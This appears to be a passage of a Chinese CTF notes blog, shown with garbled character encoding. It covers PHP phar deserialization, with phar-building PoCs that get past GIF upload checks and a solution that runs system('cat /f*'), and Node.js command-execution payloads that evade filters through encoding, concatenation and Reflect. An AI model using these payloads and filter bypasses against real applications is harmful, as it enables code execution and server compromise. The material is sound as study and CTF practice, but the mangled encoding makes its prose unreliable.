å­˜å…¥manifestï¼Œå®ç°æˆ‘ä»¬æƒ³è¦çš„æ“ä½œ$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//è®¾ç½®stub//stubæ˜¯ä¸€ä¸ªç®€å•çš„phpæ–‡ä»¶ã€‚PHPé€šè¿‡ stub è¯†åˆ«ä¸€ä¸ªæ–‡ä»¶ä¸ºPHARæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ä»¥åŠæ–‡ä»¶çš„å†…å®¹$phartest-&gt;stopBuffering();//åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜?&gt;\n\næ¥çœ‹çœ‹å¾—åˆ°çš„pharæ–‡ä»¶\n\nå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä»€ä¹ˆæ—¶å€™è¿™ä¸ªå­—ç¬¦ä¸²ä¼šè¢«ååºåˆ—åŒ–å‘¢ï¼Ÿ\nPhar ååºåˆ—åŒ–ä»¥åŠå¯åˆ©ç”¨å‡½æ•°phpçš„å¤§éƒ¨åˆ†æ–‡ä»¶å‡½æ•°åœ¨é€šè¿‡phar:&#x2F;&#x2F;ä¼ªåè®®è¯»å–pharæ–‡ä»¶çš„æ—¶å€™ï¼Œéƒ½ä¼šå°†mata-dataå­—æ®µååºåˆ—åŒ–æ“ä½œï¼Œå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š\n\n\n\nèƒ½å¤Ÿåˆ©ç”¨çš„å‡½æ•°\n\n\n\n\n\n\nfileatime\nfilectime\nfile_exists\nfile_get_contents\n\n\nfile_put_contents\nfile\nfilegroup\nfopen\n\n\nfileinode\nfilemtime\nfileowner\nfileperms\n\n\nis_dir\nis_executable\nis_file\nis_link\n\n\nis_readable\nis_writable\nis_writeable\nparse_ini_file\n\n\ncopy\nunlink\nstat\nreadfile\n\n\nå¸¸è§çš„å°±æ˜¯file_existså‡½æ•°äº†\nä¸ºä»€ä¹ˆ Phar ä¼šååºåˆ—åŒ–å¤„ç†æ–‡ä»¶å¹¶ä¸”åœ¨æ–‡ä»¶æ“ä½œä¸­èƒ½å¤ŸæˆåŠŸååºåˆ—åŒ–å‘¢ï¼Ÿè¿™é‡Œéœ€è¦é€šè¿‡phpåº•å±‚ä»£ç æ‰èƒ½çŸ¥é“ï¼Œå…³äºè¿™ä¸ªé—®é¢˜ZSXå¸ˆå‚…çš„Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜å·²ç»è¯¦ç»†åˆ†æäº†ã€‚\nå½“è¿™äº›å‡½æ•°æ¥æ”¶åˆ°phar://ä¼ªåè®®å¤„ç†åˆ° phar æ–‡ä»¶çš„æ—¶å€™ï¼ŒMeta-data é‡Œçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œå®ç°ä¸ä½¿ç”¨unserialize() å‡½æ•°å®ç°ååºåˆ—åŒ–çš„æ“ä½œ\nå½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œæå¤§çš„æ‹“å±•äº†ååºåˆ—åŒ–æ”»å‡»é¢ã€‚\nåˆ©ç”¨æ¡ä»¶\npharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚\nå¦‚file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()ç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€è·³æ¿â€ã€‚\næ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚\n\nååºåˆ—åŒ–æ”»å‡»æ‹“å±•upload_file.phpåç«¯æ£€æµ‹æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºgifï¼Œæ–‡ä»¶åç¼€åæ˜¯å¦ä¸ºgif\n&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) &amp;&amp; (substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;) + 1) == &#x27;gif&#x27;)) &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123;        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;    &#125; else &#123;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];    &#125;&#125; else &#123;    echo &quot;Invalid file, you can only upload gif&quot;;&#125;\n\nupload_file.html:\n&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\nun.php:\n&lt;?php$filename=@$_GET[&#x27;filename&#x27;];echo &#x27;please input a filename&#x27;.&#x27;&lt;br /&gt;&#x27;;class AnyClass&#123;    var $output = &#x27;echo &quot;ok&quot;;&#x27;;    function __destruct()    &#123;           eval($this -&gt; output);    &#125;&#125;    if(file_exists($filename))&#123;        $a = new AnyClass();    &#125;    else&#123;        echo &#x27;file is not exists&#x27;;    &#125;?&gt;\n\nè¯¥demoç¯å¢ƒå­˜åœ¨ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼ gifå›¾ï¼Œç¬¬äºŒå­˜åœ¨é­”æœ¯æ–¹æ³•__destruct()ä»¥åŠæ–‡ä»¶æ“ä½œå‡½æ•°file_exists()ï¼Œè€Œä¸”åœ¨AnyClassç±»ä¸­è°ƒç”¨äº†evalï¼Œä»¥æ­¤ç”¨æ¥å‘½ä»¤æ‰§è¡Œã€‚\næ ¹æ®un.phpå†™ä¸€ä¸ªç”Ÿæˆpharçš„phpæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¤´åŠ ä¸ŠGIF89aç»•è¿‡gifã€‚å°†pharæ–‡ä»¶åç¼€æ”¹ä¸ºgifä¸Šä¼ ä¸Šå»ã€‚ç„¶ååˆ©ç”¨file_existsï¼Œä½¿ç”¨phar:&#x2F;&#x2F;æ‰§è¡Œä»£ç \npoc:\n&lt;?phpclass AnyClass&#123;    var $output = &#x27;&#x27;;&#125;$phar = new Phar(&#x27;phar.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$object = new AnyClass();$object -&gt; output= &#x27;phpinfo();&#x27;;$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering();\n\nè¿è¡Œç”Ÿæˆå‡ºphar.pharåï¼Œæ”¹åç¼€åä¸ºgif\npayload:un.php?filename=phar://phar.gif/test\nä¾‹é¢˜[HNCTF 2022 WEEK3]ez_pharhttps://www.nssctf.cn/problem/3018\n&lt;?phpshow_source(__FILE__);class Flag&#123;    public $code;    public function __destruct()&#123;    // TODO: Implement __destruct() method.        eval($this-&gt;code);    &#125;&#125;$filename = $_GET[&#x27;filename&#x27;];file_exists($filename);?&gt;\n\næœ€ç®€å•çš„pharååºåˆ—åŒ–+popé“¾,popé“¾éƒ¨åˆ†ç›´æ¥ç»™å‡ºexp:\n&lt;?phpclass Flag&#123;    public $code=&quot;system(&#x27;cat /f*&#x27;)&quot;;    public function __destruct()&#123;        eval($this-&gt;code);    &#125;&#125;    ?&gt;\n\né¢˜ç›®æç¤ºupload something,è®¿é—®upload.php,æœç„¶èƒ½ä¸Šä¼ æ–‡ä»¶\n\næ¥ç€æ¥åˆ¶ä½œpharæ–‡ä»¶\n&lt;?phpclass Flag&#123;    public $code=&quot;system(&#x27;cat /f*&#x27;);&quot;;    public function __destruct()&#123;        // TODO: Implement __destruct() method.        eval($this-&gt;code);    &#125;&#125;$a = new Flag();$phar = new Phar(&#x27;exp.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;1&#x27;);$phar-&gt;stopBuffering();\n\nç”Ÿæˆexp.phar,ç„¶åæäº¤\n\nåªèƒ½ä¸Šä¼ jpg,png,jpegã€‚åç¼€æ”¹æˆpngå†ä¸Šä¼ \n\nç„¶åé€šè¿‡pharä¼ªåè®®è§¦å‘ååºåˆ—åŒ–,?filename=phar://upload/exp.pngå¾—åˆ°flag\n\nNSSCTF&#123;e44cafda-285c-49a1-ac7e-181fabed6c90&#125;\n\nå¯¼è‡´pharè§¦å‘çš„å…¶ä»–åœ°æ–¹(sql)Postgres&lt;?php$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;test&quot;, &quot;root&quot;, &quot;root&quot;));@$pdo-&gt;pgsqlCopyFromFile(&#x27;aa&#x27;, &#x27;phar://test.phar/aa&#x27;);\n\nå½“ç„¶ï¼ŒpgsqlCopyToFileå’Œpg_traceåŒæ ·ä¹Ÿæ˜¯èƒ½ä½¿ç”¨çš„ï¼Œåªæ˜¯å®ƒä»¬éœ€è¦å¼€å¯pharçš„å†™åŠŸèƒ½ã€‚\nMysqlLOAD DATA LOCAL INFILEä¹Ÿä¼šè§¦å‘pharé€ æˆååºåˆ—åŒ–ã€‚\n&lt;?phpclass TestObject &#123;    function __destruct()    &#123;        echo $this-&gt;data;        echo &#x27;Destruct called&#x27;;    &#125;    &#125;    // $filename = &#x27;compress.zlib://phar://phar.phar/test.txt&#x27;;    // file_get_contents($filename);     $m = mysqli_init();    mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);    $s = mysqli_real_connect($m, &#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;test&#x27;, 3306);    $p = mysqli_query($m, &#x27;LOAD DATA LOCAL INFILE \\&#x27;phar://phar.phar/test.txt\\&#x27; INTO TABLE users  LINES TERMINATED BY \\&#x27;\\r\\n\\&#x27;  IGNORE 1 LINES;&#x27;); ?&gt;\n\n\nå¯ä»¥çœ‹åˆ°mysqlè¯»å–pharæ–‡ä»¶çš„æ—¶å€™æˆåŠŸè§¦å‘äº†ååºåˆ—åŒ–\nä¾‹é¢˜SUCTF2019-Upload labs 2","categories":["php phar ååºåˆ—åŒ–"],"tags":["phar ååºåˆ—åŒ– php"]},{"title":"node.jså‘½ä»¤æ‰§è¡Œ","url":"/2025/09/13/node-js%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"node.jsä¸­çš„å‘½ä»¤æ‰§è¡Œchild_processé¦–å…ˆä»‹ç»ä¸€ä¸‹nodejsä¸­ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¨¡å—child_processã€‚Nodejsé€šè¿‡ä½¿ç”¨child_processæ¨¡å—æ¥ç”Ÿæˆå¤šä¸ªå­è¿›ç¨‹æ¥å¤„ç†å…¶ä»–äº‹ç‰©ã€‚åœ¨child_processä¸­æœ‰ä¸ƒä¸ªæ–¹æ³•å®ƒä»¬åˆ†åˆ«ä¸ºï¼šexecFileSyncã€spawnSync,execSyncã€forkã€execã€execFileã€ä»¥åŠspawn,è€Œè¿™äº›æ–¹æ³•ä½¿ç”¨åˆ°çš„éƒ½æ˜¯spawn()æ–¹æ³•ã€‚\nrequire(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); //è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ argsrequire(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]);require(&quot;child_process&quot;).spawnSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);require(&quot;child_process&quot;).execFileSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);\n\næ­£å¸¸çš„node.jså‘½ä»¤æ‰§è¡Œ:\nrequire(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);\n\nåŠ¨æ€çš„ä¸€ç§ç»•è¿‡æŸäº›é™åˆ¶ï¼ˆæ¯”å¦‚æ¨¡å—ç¼“å­˜æˆ–åŒ…ç®¡ç†å™¨çš„é™åˆ¶ï¼‰çš„æ–¹æ³•\nglobal.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)\n\nå…¶ä¸­,global.process.mainModule.constructor._loadæ¥åŠ¨æ€å¯¼å…¥child_processæ¨¡å—\nnode.jsä¸­å¦‚ä½•è®¿é—®å±æ€§\n\nç”¨.è®¿é—®å¯¹è±¡çš„å±æ€§\n\nç”¨[]è®¿é—®å±æ€§\n\n\nä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä»£ç ç¤ºä¾‹:\nconst express = require(&#x27;express&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)const app = express()app.use(bodyParser.urlencoded(&#123; extended: true &#125;))app.post(&#x27;/&#x27;, function (req, res) &#123;    code = req.body.code;    console.log(code);    res.send(eval(code));&#125;)app.listen(3000)\n\nåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯æ¥å—postæ–¹å¼ä¼ è¿‡æ¥çš„codeå‚æ•°ï¼Œç„¶åè¿”å›eval(code)çš„ç»“æœã€‚å¯ä»¥ç”¨ä»¥ä¸‹çš„payloadæ¥rce\neval(&#x27;require(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;)\n\nnode.jsä¸­çš„å‘½ä»¤ç»•è¿‡å‚è€ƒ:https://www.anquanke.com/post/id/237032#h2-0\nç¼–ç ç»•è¿‡\n16è¿›åˆ¶ç»•è¿‡ \\x61\nç¬¬ä¸€ç§æ€è·¯æ˜¯16è¿›åˆ¶ç¼–ç ï¼ŒåŸå› æ˜¯åœ¨nodejsä¸­ï¼Œå¦‚æœåœ¨å­—ç¬¦ä¸²å†…ç”¨16è¿›åˆ¶ï¼Œå’Œè¿™ä¸ª16è¿›åˆ¶å¯¹åº”çš„asciiç çš„å­—ç¬¦æ˜¯ç­‰ä»·çš„\nconsole.log(&quot;a&quot;===&quot;\\x61&quot;);// true\n\nä½†æ˜¯åœ¨æ­£åˆ™åŒ¹é…çš„æ—¶å€™ï¼Œ16è¿›åˆ¶å´ä¸ä¼šè½¬åŒ–æˆå­—ç¬¦ï¼Œæ‰€ä»¥å°±å¯ä»¥ç»•è¿‡æ­£åˆ™çš„æ ¡éªŒã€‚æ‰€ä»¥å¯ä»¥ä¼ \nrequire(&quot;child_process&quot;)[&quot;exe\\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)\n\nunicodeç¼–ç ç»•è¿‡ â€åæ–œæ +u+ç ç‚¹â€ \\u0061\næ€è·¯è·Ÿä¸Šé¢æ˜¯ç±»ä¼¼çš„ï¼Œç”±äºJavaScriptå…è®¸ç›´æ¥ç”¨ç ç‚¹è¡¨ç¤ºUnicodeå­—ç¬¦ï¼Œå†™æ³•æ˜¯â€åæ–œæ +u+ç ç‚¹â€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªå­—ç¬¦çš„unicodeå½¢å¼æ¥ä»£æ›¿å¯¹åº”å­—ç¬¦ã€‚\nconsole.log(&quot;\\u0061&quot;===&quot;a&quot;);// truerequire(&quot;child_process&quot;)[&quot;exe\\u0063Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)\n\nbase64ç¼–ç ç»•è¿‡\neval(Buffer.from(&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;,&#x27;base64&#x27;).toString())\n\nè¿™äº›éƒ½æ˜¯å¯¹å­—ç¬¦æ“ä½œï¼Œå°±æ˜¯ è¢«å¼•å·æˆ–è€…åå¼•å·åŒ…è£¹èµ·æ¥çš„å­—ç¬¦\n&quot;&quot;&#x27;&#x27;``\n\næ‹¼æ¥ç»•è¿‡\nåŠ å·+æ‹¼æ¥\nåŸç†å¾ˆç®€å•ï¼ŒåŠ å·åœ¨jsä¸­å¯ä»¥ç”¨æ¥è¿æ¥å­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·\nrequire(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2b&#x27;cSync&#x27;](&#x27;curl 127.0.0.1:1234&#x27;)\n\nconcatæ‹¼æ¥\nåˆ©ç”¨jsä¸­çš„concatå‡½æ•°è¿æ¥å­—ç¬¦ä¸²\nrequire(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)\n\næ¨¡æ¿å­—ç¬¦ä¸²nodejsä¸­ &#96;&#96; ç­‰ä»·äº å¼•å·\næ¯”è¾ƒç‰¹æ®Šçš„æ˜¯å ä½ç¬¦ $&#123;expression&#125; å¯ä»¥é•¶å¥—å˜é‡\n`$&#123;&#125;`è¢«``åŒ…è£¹\n\n$&#123;&#125;æ‹¼æ¥çš„å­—ç¬¦ä¸²æ±‡æ€»è¿™é‡Œæ€»ç»“ä¸€ä¸‹$&#123;&#125;æ‹¼æ¥çš„å­—ç¬¦ä¸²ï¼Œä»¥ä¾¿å¿«é€Ÿä½¿ç”¨\nprocess     \t`$&#123;`$&#123;`proce`&#125;ss`&#125;`prototype\t\t`$&#123;`$&#123;`prototyp`&#125;e`&#125;`get_process\t\t`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`require\t\t\t`$&#123;`$&#123;`requir`&#125;e`&#125;`execSync\t\t`$&#123;`$&#123;`exe`&#125;cSync`&#125;`return process\t`$&#123;`$&#123;`return proc`&#125;ess`&#125;`constructor\t\t`$&#123;`$&#123;`constructo`&#125;r`&#125;`child_process\t`$&#123;`$&#123;`child_proces`&#125;s`&#125;`\n\nä¾‹å¦‚:\nrequire(&#x27;child_process&#x27;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;curl 127.0.0.1:1234&#x27;)\n\nObejct.keyså®é™…ä¸Šé€šè¿‡requireå¯¼å…¥çš„æ¨¡å—æ˜¯ä¸€ä¸ªObjectï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨Objectä¸­çš„æ–¹æ³•æ¥æ“ä½œè·å–å†…å®¹ã€‚åˆ©ç”¨Object.valueså°±å¯ä»¥æ‹¿åˆ°child_processä¸­çš„å„ä¸ªå‡½æ•°æ–¹æ³•ï¼ŒObject.values(obj) ä¼šè¿”å›å¯¹è±¡ä¸­ å€¼çš„æ•°ç»„ï¼Œå†é€šè¿‡æ•°ç»„ä¸‹æ ‡å°±å¯ä»¥æ‹¿åˆ°execSync\nObject.values(require(&#x27;child_process&#x27;))[5](&#x27;curl 127.0.0.1:1234&#x27;)\n\nç­‰ä»·äºnodejsä¸­çš„å‘½ä»¤æ‰§è¡Œ\nåå°„å¯ä»¥è¿›è¡Œæ¨¡ç³Šè°ƒç”¨ï¼Œå®é™…ä½œç”¨æ¯”ä¸ä¸Šæ¨¡æ¿å­—ç¬¦ä¸²\né€šè¿‡Reflectè¿™ä¸ªå…³é”®å­—æ¥å®ç°åå°„è°ƒç”¨å‡½æ•°çš„æ–¹å¼\nè¦å¾—åˆ°evalå‡½æ•°ï¼Œå¯ä»¥é¦–å…ˆé€šè¿‡Reflect.ownKeys(global)æ‹¿åˆ°æ‰€æœ‰å‡½æ•°ï¼Œç„¶åglobal[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]å³å¯å¾—åˆ°eval\nconsole.log(Reflect.ownKeys(global)) //è¿”å›æ‰€æœ‰å‡½æ•°console.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;eval&#x27;))])//å¾—åˆ°eval\n\n\næ›¿æ¢æˆ:\nconsole.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;ev&#x27;))])\n\nä¹Ÿæ˜¯å¯ä»¥çš„\n\nä¹Ÿå¯ä»¥æ›¿æ¢ä¸º\nconsole.log(global[Reflect.ownKeys(global).find(x=&gt;x.startsWith(&#x27;eva&#x27;))])æ³¨æ„ä¸æ˜¯startswith\n\nè¿‡æ»¤ä¸­æ‹¬å·çš„æƒ…å†µè·å–åˆ°evalçš„æ–¹å¼æ˜¯é€šè¿‡globalæ•°ç»„ï¼Œå…¶ä¸­ç”¨åˆ°äº†ä¸­æ‹¬å·[]ï¼Œå‡å¦‚ä¸­æ‹¬å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨Reflect.getæ¥ç»•\nReflect.get(target, propertyKey[, receiver])//ä½œç”¨æ˜¯è·å–å¯¹è±¡èº«ä¸ŠæŸä¸ªå±æ€§çš„å€¼ï¼Œç±»ä¼¼äºtarget[name]\n\nå¯ä»¥æ‹¿å¯¹è±¡çš„å±æ€§,æ‰§è¡Œä»»æ„å‘½ä»¤\nReflect.get(global, Reflect.ownKeys(global).find(x =&gt; x.includes(&#x27;eva&#x27;)))(&quot;console.log(\\&quot;123\\&quot;);&quot;);\n\nè§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç :\n\nReflect.ownKeys(global)\n\n\nè·å– global å¯¹è±¡çš„ æ‰€æœ‰è‡ªæœ‰å±æ€§çš„ keyï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾å±æ€§ï¼‰ã€‚\nåœ¨ Node.js é‡Œï¼Œglobal ç›¸å½“äºæµè§ˆå™¨çš„ windowï¼Œé‡Œé¢æœ‰å„ç§å…¨å±€å‡½æ•°å’Œå¯¹è±¡ã€‚\nå…¶ä¸­æœ‰ä¸€ä¸ªå…³é”®å±æ€§å°±æ˜¯ evalï¼ˆå…¨å±€çš„ä»£ç æ‰§è¡Œå‡½æ•°ï¼‰ã€‚\n\n\n.find(x =&gt; x.includes(&#39;eva&#39;))\n\n\néå†æ‰€æœ‰ keyï¼Œæ‰¾ç¬¬ä¸€ä¸ªåŒ…å« &#39;eva&#39; çš„åå­—ã€‚\næ­£å¥½ä¼šåŒ¹é…åˆ° &quot;eval&quot;ã€‚\n\n\nReflect.get(global, &quot;eval&quot;)\n\n\nä» global å¯¹è±¡é‡Œå–å‡º eval å‡½æ•°ã€‚\n\nç­‰ä»·äº global.evalã€‚\n\n\n\nè°ƒç”¨ç»“æœ:\n\n\næ‰§è¡Œeval(&quot;console.log(\\&quot;123\\&quot;);&quot;);\n\njavascriptå¤§å°å†™ç‰¹æ€§åœ¨javascriptä¸­æœ‰å‡ ä¸ªç‰¹æ®Šçš„å­—ç¬¦éœ€è¦è®°å½•ä¸€ä¸‹\nå¯¹äºtoUpperCase():\nå­—ç¬¦&quot;Ä±&quot;ã€&quot;Å¿&quot; ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º &quot;I&quot;ã€&quot;S&quot;\n\nå¯¹äºtoLowerCase():\nå­—ç¬¦&quot;â„ª&quot;ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º&quot;k&quot;(è¿™ä¸ªâ„ªä¸æ˜¯K)\n\nåœ¨ç»•ä¸€äº›è§„åˆ™çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡\nä¾‹é¢˜[GFCTF 2021]ez_calcif(req.body.username.toLowerCase() !== &#x27;admin&#x27; &amp;&amp; req.body.username.toUpperCase() === &#x27;ADMIN&#x27; &amp;&amp; req.body.passwd === &#x27;admin123&#x27;)&#123;        // ç™»å½•æˆåŠŸï¼Œè®¾ç½® session&#125;\n\nusernameè®¾ç½®æˆadmÄ±npasswordè®¾ç½®æˆadmin123\nç™»å½•åå¾—åˆ°æºç \nlet calc = req.body.calc;let flag = false;//waffor (let i = 0; i &lt; calc.length; i++) &#123;    if (flag || &quot;/(flc&#x27;\\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;        flag = true;        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);    &#125;&#125;//æˆªå–calc = calc.substring(0, 64);//å»ç©ºcalc = calc.replace(/\\s+/g, &quot;&quot;);calc = calc.replace(/\\\\/g, &quot;\\\\\\\\&quot;);//å°æ˜çš„åŒå­¦è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå±é™©çš„ä¸œè¥¿while (calc.indexOf(&quot;sh&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;sh&quot;, &quot;&quot;);&#125;while (calc.indexOf(&quot;ln&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;ln&quot;, &quot;&quot;);&#125;while (calc.indexOf(&quot;fs&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;fs&quot;, &quot;&quot;);&#125;while (calc.indexOf(&quot;x&quot;) &gt; -1) &#123;    calc = calc.replace(&quot;x&quot;, &quot;&quot;);&#125;try &#123;    result = eval(calc);&#125;\n\nè§£é‡Šä¸€ä¸‹ä»£ç :\næ£€æµ‹å½“å‰å…ƒç´ æ˜¯å¦éæ³•ï¼ˆæˆ–ä¹‹å‰å·²ç»å‘ç°è¿‡éæ³•å…ƒç´ ï¼‰ã€‚\nä¸€æ—¦è§¦å‘ï¼Œå°± æŠŠ flag ç½®ä¸º trueï¼Œç¡®ä¿ä¹‹åæ¯ä¸ªå…ƒç´ éƒ½è¿›å…¥æ›¿æ¢é€»è¾‘ã€‚\nç”¨ &quot;\\*&quot; æ›¿æ¢å½“å‰å…ƒç´ ï¼ˆä½†å› ä¸º + æ‹¼æ¥ï¼Œæ•°ç»„è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼‰ã€‚\næç¤º:\n1.åˆ«æƒ³å¤ªå¤æ‚ï¼Œè¯•ç€ä¼ ä¼ å…¶ä»–æ•°æ®ç±»å‹2.å­—ç¬¦ä¸²çš„lengthå’Œæ•°ç»„çš„lengthæ˜¯ä¸ä¸€æ ·çš„ã€‚ä½ èƒ½å°†è‡ªå·±çš„payloadé€ƒé€¸å‡ºæ¥å—ã€‚\n\nå¯ä»¥åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•\nlet calc = &quot;aaaa.aaa&quot;;let flag = false;//waffor (let i = 0; i &lt; calc.length; i++) &#123;    if (flag || &quot;/(flc&#x27;\\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;        flag = true;        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);    &#125;&#125;console.log(calc)//\n\n\néæ³•å­—ç¬¦åçš„å­—ç¬¦éƒ½æ›¿æ¢æˆ ****\nå†è¿›è¡Œæµ‹è¯•\nlet calc = [&#x27;aaaaaaaaaa&#x27;,&#x27;bbbb&#x27;,&#x27;.&#x27;];let flag = false;console.log(calc.length)//waffor (let i = 0; i &lt; calc.length; i++) &#123;    if (flag || &quot;/(flc&#x27;\\&quot;.&quot;.split``.some(v =&gt; v == calc[i])) &#123;        flag = true;        calc = calc.slice(0, i) + &quot;*&quot; + calc.slice(i + 1, calc.length);    &#125;&#125;console.log(calc)\n\n\nåœ¨æ•°ç»„çš„ç¬¬ä¸‰ä¸ªå…ƒç´ å‘ç°éæ³•å­—ç¬¦,ä½†æ˜¯sliceæ˜¯ä»ç¬¬ä¸‰çš„å…ƒç´ å¼€å§‹æ›¿æ¢\nå­˜åœ¨é€»è¾‘é—®é¢˜ï¼Œå¯ä»¥é€ƒé€¸å‰ä¸‰ä¸ªå­—ç¬¦ï¼ˆä»»æ„å€¼ï¼‰\n\nå› ä¸ºç¦æ­¢äº†x,ä¸èƒ½å‡ºç°exec,å¯ä»¥ç”¨require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]);\nç›´æ¥è°ƒç”¨ 